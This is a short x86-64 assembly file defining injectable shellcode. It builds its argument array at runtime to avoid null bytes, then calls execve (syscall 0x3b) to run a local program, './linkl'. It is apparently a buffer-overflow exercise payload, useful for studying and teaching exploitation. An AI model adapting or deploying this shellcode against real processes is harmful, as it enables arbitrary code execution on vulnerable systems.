.data
.globl shellcode
shellcode:
	jmp over_string
string_addr:
	.ascii "./linklNAAAAAAAABBBBBBBB"
over_string:
	leaq string_addr(%rip), %rdi
	xorl %eax, %eax
	movb %al, 0x07(%rdi)
	movq %rdi, 0x08(%rdi)
	movq %rax, 0x10(%rdi)
	leaq 0x08(%rdi), %rsi
	movq %rax, %rdx
	movb $0x3b, %al
	syscall
	.byte 0
